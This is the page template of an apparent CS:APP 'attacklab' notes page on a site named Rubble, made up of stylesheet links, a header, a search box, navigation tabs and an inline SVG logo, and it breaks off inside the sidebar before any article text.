
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
      <link rel="shortcut icon" href="../../../assets/harddisk4.svg">
      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-6.1.3">
    
    
      
        
            <title>attacklab - Rubble</title>
        
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.2cb7adb3.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.f0267088.min.css">
        
      
    
    
    
      
    
    
    
      <link rel="stylesheet" href="../../../css/general.css">
    
      <link rel="stylesheet" href="../../../css/fonts.css">
    
      <link rel="stylesheet" href="../../../css/code-admonition.css">
    
      <link rel="stylesheet" href="../../../css/katex.css">
    
      <link rel="stylesheet" href="../../../css/tables.css">
    
      <link rel="stylesheet" href="../../../css/extra/admonitions.css">
    
      <link rel="stylesheet" href="../../../css/extra/code-blocks.css">
    
      <link rel="stylesheet" href="../../../css/gadgets/book.css">
    
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/katex.min.css">
    
    
      
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="rubble" data-md-color-primary="" data-md-color-accent="">
      
  
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#_1" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid" aria-label="Header">
    <a href="../../.." title="Rubble" class="md-header-nav__button md-logo" aria-label="Rubble">
      
  
  <?xml version="1.0" encoding="iso-8859-1"?>
<!-- Generator: Adobe Illustrator 19.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 viewBox="0 0 511.874 511.874" style="enable-background:new 0 0 511.874 511.874;" xml:space="preserve">
<rect x="27.997" y="51.967" style="fill:#CCD1D9;" width="15.996" height="264.01"/>
<g>
	<rect x="43.987" y="52.047" style="fill:#AC92EC;" width="439.89" height="263.86"/>
	<path style="fill:#AC92EC;" d="M255.937,355.897c6.639,0,11.996,5.358,11.996,11.997s-5.357,11.997-11.996,11.997
		c-6.639,0-11.997-5.358-11.997-11.997S249.298,355.897,255.937,355.897z"/>
</g>
<g>
	<path style="fill:#CCD1D9;" d="M507.875,372.049v15.84c0,13.513-10.48,23.994-23.994,23.994c-5.678,0-85.018,0-176.035,0
		c-34.068,0-69.748,0-103.817,0c-91.017,0-170.357,0-176.035,0C14.474,411.883,4,401.402,4,387.889v-15.84
		c0,13.2,10.794,23.994,23.994,23.994h227.943H483.88C497.082,396.043,507.875,385.249,507.875,372.049z"/>
	<path style="fill:#CCD1D9;" d="M307.845,411.883l15.996,71.982H188.032l15.996-71.982
		C238.098,411.883,273.777,411.883,307.845,411.883z"/>
</g>
<g style="opacity:0.5;">
	<polygon style="fill:#FFFFFF;" points="200.474,427.879 188.032,483.866 204.028,483.866 216.47,427.879 	"/>
</g>
<g style="opacity:0.1;">
	<polygon points="311.392,427.879 323.841,483.866 307.845,483.866 295.396,427.879 	"/>
</g>
<g style="opacity:0.5;">
	<path style="fill:#FFFFFF;" d="M29.446,396.043h-1.453c-13.2,0-23.994-10.794-23.994-23.994v15.84
		c0,13.513,10.474,23.994,23.994,23.994c1.726,0,10.357,0,23.994,0C41.365,411.883,32.711,405.369,29.446,396.043z"/>
</g>
<g style="opacity:0.1;">
	<path d="M482.427,396.043h1.453c13.201,0,23.994-10.794,23.994-23.994v15.84c0,13.513-10.48,23.994-23.994,23.994
		c-1.734,0-10.355,0-23.994,0C470.509,411.883,479.164,405.369,482.427,396.043z"/>
</g>
<g>
	<path style="fill:#F5F7FA;" d="M507.875,339.901v32.148c0,13.2-10.793,23.994-23.994,23.994H255.937v-16.152
		c6.639,0,11.996-5.358,11.996-11.997s-5.357-11.997-11.996-11.997v-15.996H507.875z"/>
	<path style="fill:#F5F7FA;" d="M255.937,379.891v16.152H27.993c-13.2,0-23.994-10.794-23.994-23.994v-0.156v-31.992h251.938v15.996
		c-6.639,0-11.997,5.358-11.997,11.997S249.298,379.891,255.937,379.891z"/>
</g>
<path style="fill:#FFFFFF;" d="M27.993,372.049v-0.156v-31.992H3.999v31.992v0.156c0,13.2,10.794,23.994,23.994,23.994h23.994
	C38.787,396.043,27.993,385.249,27.993,372.049z"/>
<path style="fill:#656D78;" d="M507.875,52.131v287.77H255.937H3.999V52.131c0-13.195,10.794-23.994,23.994-23.994H483.88
	C497.082,28.137,507.875,38.936,507.875,52.131z M483.88,315.907V67.967V51.971h-15.996h-15.996h-23.994h-15.996h-15.996h-15.996
	H363.91H187.954h-31.992H123.97H91.978H59.985H27.993v15.996v247.94H483.88z"/>
<g style="opacity:0.2;">
	<path style="fill:#FFFFFF;" d="M27.993,67.967V52.131v-0.16h0.016c0.086-13.121,10.833-23.834,23.978-23.834H27.993
		c-13.2,0-23.994,10.799-23.994,23.994v287.77h23.994v-23.994V67.967z"/>
</g>
<g style="opacity:0.3;">
	<path d="M483.88,67.967V52.131v-0.16h-0.016c-0.094-13.121-10.84-23.834-23.979-23.834h23.994
		c13.201,0,23.994,10.799,23.994,23.994v287.77h-23.994v-23.994V67.967H483.88z"/>
</g>
<g style="opacity:0.1;">
	<path d="M311.4,427.879l-3.555-15.996c-34.068,0-69.748,0-103.817,0l-3.554,15.996H311.4z"/>
</g>
<g>
	<path style="fill:#3A3847;" d="M507.875,343.853H3.999c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h503.875
		c2.211,0,4,1.789,4,3.999S510.085,343.853,507.875,343.853z"/>
	<path style="fill:#3A3847;" d="M255.937,383.828c-8.818,0-15.996-7.17-15.996-15.996s7.178-15.996,15.996-15.996
		s15.996,7.17,15.996,15.996S264.755,383.828,255.937,383.828z M255.937,359.833c-4.405,0-7.998,3.593-7.998,7.998
		s3.593,7.998,7.998,7.998c4.412,0,7.998-3.593,7.998-7.998S260.349,359.833,255.937,359.833z"/>
	<path style="fill:#3A3847;" d="M188.009,487.818c-0.289,0-0.578-0.031-0.875-0.094c-2.156-0.484-3.515-2.617-3.038-4.772
		l15.996-71.982c0.484-2.147,2.647-3.476,4.772-3.038c2.156,0.484,3.515,2.616,3.039,4.771l-15.996,71.982
		C191.492,486.552,189.836,487.818,188.009,487.818z"/>
	<path style="fill:#3A3847;" d="M323.873,487.818c-1.834,0-3.49-1.266-3.904-3.133l-15.996-71.982
		c-0.477-2.155,0.883-4.287,3.039-4.771c2.178-0.477,4.295,0.891,4.771,3.038l15.996,71.982c0.477,2.155-0.883,4.288-3.039,4.772
		C324.451,487.787,324.154,487.818,323.873,487.818z"/>
	<path style="fill:#3A3847;" d="M335.917,487.818h-159.96c-2.211,0-3.999-1.789-3.999-3.999c0-2.211,1.788-3.999,3.999-3.999h159.96
		c2.211,0,3.998,1.788,3.998,3.999C339.916,486.029,338.128,487.818,335.917,487.818z"/>
	<path style="fill:#3A3847;" d="M483.88,319.984H27.993c-2.21,0-3.999-1.789-3.999-3.999V52.049c0-2.21,1.789-3.999,3.999-3.999
		H483.88c2.211,0,4,1.789,4,3.999v263.936C487.88,318.195,486.091,319.984,483.88,319.984z M31.992,311.986h447.89V56.048H31.992
		V311.986z"/>
	<path style="fill:#3A3847;" d="M483.88,399.964H27.993C12.559,399.964,0,387.404,0,371.971V52.049
		c0-15.434,12.56-27.993,27.993-27.993H483.88c15.434,0,27.994,12.56,27.994,27.993v319.922
		C511.875,387.405,499.314,399.964,483.88,399.964z M27.993,32.054c-11.021,0-19.995,8.971-19.995,19.995v319.922
		c0,11.028,8.975,19.995,19.995,19.995H483.88c11.029,0,19.996-8.967,19.996-19.995V52.049c0-11.024-8.967-19.995-19.996-19.995
		C483.88,32.054,27.993,32.054,27.993,32.054z"/>
	<path style="fill:#3A3847;" d="M483.88,415.835H27.993C12.302,415.835,0,403.541,0,387.842v-15.996c0-2.21,1.789-3.999,3.999-3.999
		s3.999,1.789,3.999,3.999v15.996c0,11.216,8.787,19.995,19.995,19.995H483.88c11.217,0,19.996-8.779,19.996-19.995v-15.871
		c0-2.21,1.789-3.999,3.998-3.999c2.211,0,4,1.789,4,3.999v15.871C511.875,403.541,499.58,415.835,483.88,415.835z"/>
	<path style="fill:#3A3847;" d="M43.989,319.984c-2.21,0-3.999-1.789-3.999-3.999V52.049c0-2.21,1.789-3.999,3.999-3.999
		s3.999,1.789,3.999,3.999v263.936C47.988,318.195,46.2,319.984,43.989,319.984z"/>
	<path style="fill:#3A3847;" d="M35.991,80.042h-7.998c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h7.998
		c2.21,0,3.999,1.789,3.999,3.999C39.99,78.254,38.202,80.042,35.991,80.042z"/>
	<path style="fill:#3A3847;" d="M35.991,104.037h-7.998c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h7.998
		c2.21,0,3.999,1.789,3.999,3.999C39.99,102.249,38.202,104.037,35.991,104.037z"/>
	<path style="fill:#3A3847;" d="M35.991,128.031h-7.998c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h7.998
		c2.21,0,3.999,1.789,3.999,3.999C39.99,126.243,38.202,128.031,35.991,128.031z"/>
	<path style="fill:#3A3847;" d="M35.991,152.025h-7.998c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h7.998
		c2.21,0,3.999,1.789,3.999,3.999C39.99,150.237,38.202,152.025,35.991,152.025z"/>
	<path style="fill:#3A3847;" d="M35.991,176.019h-7.998c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h7.998
		c2.21,0,3.999,1.789,3.999,3.999C39.99,174.231,38.202,176.019,35.991,176.019z"/>
	<path style="fill:#3A3847;" d="M35.991,200.013h-7.998c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h7.998
		c2.21,0,3.999,1.789,3.999,3.999S38.202,200.013,35.991,200.013z"/>
	<path style="fill:#3A3847;" d="M35.991,224.007h-7.998c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h7.998
		c2.21,0,3.999,1.789,3.999,3.999S38.202,224.007,35.991,224.007z"/>
	<path style="fill:#3A3847;" d="M35.991,248.001h-7.998c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h7.998
		c2.21,0,3.999,1.789,3.999,3.999S38.202,248.001,35.991,248.001z"/>
	<path style="fill:#3A3847;" d="M35.991,271.996h-7.998c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h7.998
		c2.21,0,3.999,1.789,3.999,3.999S38.202,271.996,35.991,271.996z"/>
	<path style="fill:#3A3847;" d="M35.991,295.99h-7.998c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h7.998
		c2.21,0,3.999,1.789,3.999,3.999S38.202,295.99,35.991,295.99z"/>
	<path style="fill:#3A3847;" d="M99.976,80.042H67.983c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h31.992
		c2.21,0,3.999,1.789,3.999,3.999C103.975,78.254,102.186,80.042,99.976,80.042z"/>
	<path style="fill:#3A3847;" d="M243.94,104.037H131.968c-2.211,0-3.999-1.788-3.999-3.999c0-2.21,1.788-3.999,3.999-3.999H243.94
		c2.21,0,3.999,1.789,3.999,3.999C247.939,102.249,246.15,104.037,243.94,104.037z"/>
	<path style="fill:#3A3847;" d="M115.972,104.037h-39.99c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h39.99
		c2.21,0,3.999,1.789,3.999,3.999C119.971,102.249,118.182,104.037,115.972,104.037z"/>
	<path style="fill:#3A3847;" d="M339.916,128.031H235.942c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.788-3.999,3.999-3.999h103.974
		c2.211,0,4,1.789,4,3.999C343.916,126.243,342.126,128.031,339.916,128.031z"/>
	<path style="fill:#3A3847;" d="M387.904,128.031h-31.992c-2.209,0-3.998-1.788-3.998-3.999c0-2.21,1.789-3.999,3.998-3.999h31.992
		c2.211,0,4,1.789,4,3.999C391.904,126.243,390.115,128.031,387.904,128.031z"/>
	<path style="fill:#3A3847;" d="M219.946,128.031H83.979c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h135.967
		c2.21,0,3.999,1.789,3.999,3.999C223.945,126.243,222.156,128.031,219.946,128.031z"/>
	<path style="fill:#3A3847;" d="M107.974,176.019H83.979c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h23.994
		c2.21,0,3.999,1.789,3.999,3.999C111.973,174.231,110.184,176.019,107.974,176.019z"/>
	<path style="fill:#3A3847;" d="M242.69,176.019H123.97c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h118.721
		c2.21,0,3.999,1.789,3.999,3.999C246.689,174.231,244.9,176.019,242.69,176.019z"/>
	<path style="fill:#3A3847;" d="M275.931,152.025H91.978c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h183.954
		c2.211,0,4,1.789,4,3.999C279.931,150.237,278.142,152.025,275.931,152.025z"/>
	<path style="fill:#3A3847;" d="M267.933,200.013h-71.981c-2.211,0-3.999-1.789-3.999-3.999s1.788-3.999,3.999-3.999h71.981
		c2.211,0,4,1.789,4,3.999S270.144,200.013,267.933,200.013z"/>
	<path style="fill:#3A3847;" d="M211.948,224.007H75.981c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h135.967
		c2.21,0,3.999,1.789,3.999,3.999S214.158,224.007,211.948,224.007z"/>
	<path style="fill:#3A3847;" d="M139.966,271.996H75.981c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h63.984
		c2.21,0,3.999,1.789,3.999,3.999S142.176,271.996,139.966,271.996z"/>
	<path style="fill:#3A3847;" d="M299.925,248.001H187.954c-2.211,0-3.999-1.789-3.999-3.999s1.788-3.999,3.999-3.999h111.971
		c2.211,0,4,1.789,4,3.999S302.136,248.001,299.925,248.001z"/>
	<path style="fill:#3A3847;" d="M323.919,248.001h-7.998c-2.209,0-3.998-1.789-3.998-3.999s1.789-3.999,3.998-3.999h7.998
		c2.211,0,4,1.789,4,3.999S326.13,248.001,323.919,248.001z"/>
	<path style="fill:#3A3847;" d="M171.958,248.001H83.979c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h87.979
		c2.21,0,3.999,1.789,3.999,3.999S174.168,248.001,171.958,248.001z"/>
	<path style="fill:#3A3847;" d="M99.976,295.99H67.983c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h31.992
		c2.21,0,3.999,1.789,3.999,3.999S102.186,295.99,99.976,295.99z"/>
	<path style="fill:#3A3847;" d="M275.931,224.007h-47.987c-2.211,0-3.999-1.789-3.999-3.999s1.788-3.999,3.999-3.999h47.987
		c2.211,0,4,1.789,4,3.999S278.142,224.007,275.931,224.007z"/>
	<path style="fill:#3A3847;" d="M339.916,200.013H283.93c-2.209,0-3.998-1.789-3.998-3.999s1.789-3.999,3.998-3.999h55.986
		c2.211,0,4,1.789,4,3.999S342.126,200.013,339.916,200.013z"/>
	<path style="fill:#3A3847;" d="M179.956,200.013H83.979c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h95.977
		c2.21,0,3.999,1.789,3.999,3.999S182.166,200.013,179.956,200.013z"/>
</g>
<g style="opacity:0.3;">
	<rect x="43.987" y="52.047" style="fill:#FFFFFF;" width="15.996" height="263.27"/>
</g>
<g style="opacity:0.2;">
	<rect x="467.887" y="52.047" width="15.996" height="263.27"/>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
</svg>


    </a>
    <label class="md-header-nav__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header-nav__title" data-md-component="header-title">
      
        <div class="md-header-nav__ellipsis">
          <span class="md-header-nav__topic md-ellipsis">
            Rubble
          </span>
          <span class="md-header-nav__topic md-ellipsis">
            
              attacklab
            
          </span>
        </div>
      
    </div>
    
      <label class="md-header-nav__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active">
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          

  

<nav class="md-tabs md-tabs--active" aria-label="Tabs" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  <li class="md-tabs__item">
    
      <a href="../../.." class="md-tabs__link">
        home
      </a>
    
  </li>

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../" class="md-tabs__link md-tabs__link--active">
          csapp👾
        </a>
      
    </li>
  

      
    </ul>
  </div>
</nav>

  
  
   
  
  
  <script>
  document.getElementsByClassName('md-header')[0].style.setProperty('--md-primary-fg-color', '#393333');
  var tabs1 = document.getElementsByClassName('md-tabs')[0]; if(tabs1) tabs1.style.setProperty('--md-primary-fg-color', '#393333');
  // 'md-default-color'
  // var tabs2 = document.getElementsByClassName('md-nav__title'); 
  // if (tabs2)
  //   for (var i = 0; i < tabs2.length; ++i)
  //     tabs2[i].style.setProperty('--md-primary-fg-color', '#393333');
  </script>

        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="Rubble" class="md-nav__button md-logo" aria-label="Rubble">
      
  
  <?xml version="1.0" encoding="iso-8859-1"?>
<!-- Generator: Adobe Illustrator 19.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 viewBox="0 0 511.874 511.874" style="enable-background:new 0 0 511.874 511.874;" xml:space="preserve">
<rect x="27.997" y="51.967" style="fill:#CCD1D9;" width="15.996" height="264.01"/>
<g>
	<rect x="43.987" y="52.047" style="fill:#AC92EC;" width="439.89" height="263.86"/>
	<path style="fill:#AC92EC;" d="M255.937,355.897c6.639,0,11.996,5.358,11.996,11.997s-5.357,11.997-11.996,11.997
		c-6.639,0-11.997-5.358-11.997-11.997S249.298,355.897,255.937,355.897z"/>
</g>
<g>
	<path style="fill:#CCD1D9;" d="M507.875,372.049v15.84c0,13.513-10.48,23.994-23.994,23.994c-5.678,0-85.018,0-176.035,0
		c-34.068,0-69.748,0-103.817,0c-91.017,0-170.357,0-176.035,0C14.474,411.883,4,401.402,4,387.889v-15.84
		c0,13.2,10.794,23.994,23.994,23.994h227.943H483.88C497.082,396.043,507.875,385.249,507.875,372.049z"/>
	<path style="fill:#CCD1D9;" d="M307.845,411.883l15.996,71.982H188.032l15.996-71.982
		C238.098,411.883,273.777,411.883,307.845,411.883z"/>
</g>
<g style="opacity:0.5;">
	<polygon style="fill:#FFFFFF;" points="200.474,427.879 188.032,483.866 204.028,483.866 216.47,427.879 	"/>
</g>
<g style="opacity:0.1;">
	<polygon points="311.392,427.879 323.841,483.866 307.845,483.866 295.396,427.879 	"/>
</g>
<g style="opacity:0.5;">
	<path style="fill:#FFFFFF;" d="M29.446,396.043h-1.453c-13.2,0-23.994-10.794-23.994-23.994v15.84
		c0,13.513,10.474,23.994,23.994,23.994c1.726,0,10.357,0,23.994,0C41.365,411.883,32.711,405.369,29.446,396.043z"/>
</g>
<g style="opacity:0.1;">
	<path d="M482.427,396.043h1.453c13.201,0,23.994-10.794,23.994-23.994v15.84c0,13.513-10.48,23.994-23.994,23.994
		c-1.734,0-10.355,0-23.994,0C470.509,411.883,479.164,405.369,482.427,396.043z"/>
</g>
<g>
	<path style="fill:#F5F7FA;" d="M507.875,339.901v32.148c0,13.2-10.793,23.994-23.994,23.994H255.937v-16.152
		c6.639,0,11.996-5.358,11.996-11.997s-5.357-11.997-11.996-11.997v-15.996H507.875z"/>
	<path style="fill:#F5F7FA;" d="M255.937,379.891v16.152H27.993c-13.2,0-23.994-10.794-23.994-23.994v-0.156v-31.992h251.938v15.996
		c-6.639,0-11.997,5.358-11.997,11.997S249.298,379.891,255.937,379.891z"/>
</g>
<path style="fill:#FFFFFF;" d="M27.993,372.049v-0.156v-31.992H3.999v31.992v0.156c0,13.2,10.794,23.994,23.994,23.994h23.994
	C38.787,396.043,27.993,385.249,27.993,372.049z"/>
<path style="fill:#656D78;" d="M507.875,52.131v287.77H255.937H3.999V52.131c0-13.195,10.794-23.994,23.994-23.994H483.88
	C497.082,28.137,507.875,38.936,507.875,52.131z M483.88,315.907V67.967V51.971h-15.996h-15.996h-23.994h-15.996h-15.996h-15.996
	H363.91H187.954h-31.992H123.97H91.978H59.985H27.993v15.996v247.94H483.88z"/>
<g style="opacity:0.2;">
	<path style="fill:#FFFFFF;" d="M27.993,67.967V52.131v-0.16h0.016c0.086-13.121,10.833-23.834,23.978-23.834H27.993
		c-13.2,0-23.994,10.799-23.994,23.994v287.77h23.994v-23.994V67.967z"/>
</g>
<g style="opacity:0.3;">
	<path d="M483.88,67.967V52.131v-0.16h-0.016c-0.094-13.121-10.84-23.834-23.979-23.834h23.994
		c13.201,0,23.994,10.799,23.994,23.994v287.77h-23.994v-23.994V67.967H483.88z"/>
</g>
<g style="opacity:0.1;">
	<path d="M311.4,427.879l-3.555-15.996c-34.068,0-69.748,0-103.817,0l-3.554,15.996H311.4z"/>
</g>
<g>
	<path style="fill:#3A3847;" d="M507.875,343.853H3.999c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h503.875
		c2.211,0,4,1.789,4,3.999S510.085,343.853,507.875,343.853z"/>
	<path style="fill:#3A3847;" d="M255.937,383.828c-8.818,0-15.996-7.17-15.996-15.996s7.178-15.996,15.996-15.996
		s15.996,7.17,15.996,15.996S264.755,383.828,255.937,383.828z M255.937,359.833c-4.405,0-7.998,3.593-7.998,7.998
		s3.593,7.998,7.998,7.998c4.412,0,7.998-3.593,7.998-7.998S260.349,359.833,255.937,359.833z"/>
	<path style="fill:#3A3847;" d="M188.009,487.818c-0.289,0-0.578-0.031-0.875-0.094c-2.156-0.484-3.515-2.617-3.038-4.772
		l15.996-71.982c0.484-2.147,2.647-3.476,4.772-3.038c2.156,0.484,3.515,2.616,3.039,4.771l-15.996,71.982
		C191.492,486.552,189.836,487.818,188.009,487.818z"/>
	<path style="fill:#3A3847;" d="M323.873,487.818c-1.834,0-3.49-1.266-3.904-3.133l-15.996-71.982
		c-0.477-2.155,0.883-4.287,3.039-4.771c2.178-0.477,4.295,0.891,4.771,3.038l15.996,71.982c0.477,2.155-0.883,4.288-3.039,4.772
		C324.451,487.787,324.154,487.818,323.873,487.818z"/>
	<path style="fill:#3A3847;" d="M335.917,487.818h-159.96c-2.211,0-3.999-1.789-3.999-3.999c0-2.211,1.788-3.999,3.999-3.999h159.96
		c2.211,0,3.998,1.788,3.998,3.999C339.916,486.029,338.128,487.818,335.917,487.818z"/>
	<path style="fill:#3A3847;" d="M483.88,319.984H27.993c-2.21,0-3.999-1.789-3.999-3.999V52.049c0-2.21,1.789-3.999,3.999-3.999
		H483.88c2.211,0,4,1.789,4,3.999v263.936C487.88,318.195,486.091,319.984,483.88,319.984z M31.992,311.986h447.89V56.048H31.992
		V311.986z"/>
	<path style="fill:#3A3847;" d="M483.88,399.964H27.993C12.559,399.964,0,387.404,0,371.971V52.049
		c0-15.434,12.56-27.993,27.993-27.993H483.88c15.434,0,27.994,12.56,27.994,27.993v319.922
		C511.875,387.405,499.314,399.964,483.88,399.964z M27.993,32.054c-11.021,0-19.995,8.971-19.995,19.995v319.922
		c0,11.028,8.975,19.995,19.995,19.995H483.88c11.029,0,19.996-8.967,19.996-19.995V52.049c0-11.024-8.967-19.995-19.996-19.995
		C483.88,32.054,27.993,32.054,27.993,32.054z"/>
	<path style="fill:#3A3847;" d="M483.88,415.835H27.993C12.302,415.835,0,403.541,0,387.842v-15.996c0-2.21,1.789-3.999,3.999-3.999
		s3.999,1.789,3.999,3.999v15.996c0,11.216,8.787,19.995,19.995,19.995H483.88c11.217,0,19.996-8.779,19.996-19.995v-15.871
		c0-2.21,1.789-3.999,3.998-3.999c2.211,0,4,1.789,4,3.999v15.871C511.875,403.541,499.58,415.835,483.88,415.835z"/>
	<path style="fill:#3A3847;" d="M43.989,319.984c-2.21,0-3.999-1.789-3.999-3.999V52.049c0-2.21,1.789-3.999,3.999-3.999
		s3.999,1.789,3.999,3.999v263.936C47.988,318.195,46.2,319.984,43.989,319.984z"/>
	<path style="fill:#3A3847;" d="M35.991,80.042h-7.998c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h7.998
		c2.21,0,3.999,1.789,3.999,3.999C39.99,78.254,38.202,80.042,35.991,80.042z"/>
	<path style="fill:#3A3847;" d="M35.991,104.037h-7.998c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h7.998
		c2.21,0,3.999,1.789,3.999,3.999C39.99,102.249,38.202,104.037,35.991,104.037z"/>
	<path style="fill:#3A3847;" d="M35.991,128.031h-7.998c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h7.998
		c2.21,0,3.999,1.789,3.999,3.999C39.99,126.243,38.202,128.031,35.991,128.031z"/>
	<path style="fill:#3A3847;" d="M35.991,152.025h-7.998c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h7.998
		c2.21,0,3.999,1.789,3.999,3.999C39.99,150.237,38.202,152.025,35.991,152.025z"/>
	<path style="fill:#3A3847;" d="M35.991,176.019h-7.998c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h7.998
		c2.21,0,3.999,1.789,3.999,3.999C39.99,174.231,38.202,176.019,35.991,176.019z"/>
	<path style="fill:#3A3847;" d="M35.991,200.013h-7.998c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h7.998
		c2.21,0,3.999,1.789,3.999,3.999S38.202,200.013,35.991,200.013z"/>
	<path style="fill:#3A3847;" d="M35.991,224.007h-7.998c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h7.998
		c2.21,0,3.999,1.789,3.999,3.999S38.202,224.007,35.991,224.007z"/>
	<path style="fill:#3A3847;" d="M35.991,248.001h-7.998c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h7.998
		c2.21,0,3.999,1.789,3.999,3.999S38.202,248.001,35.991,248.001z"/>
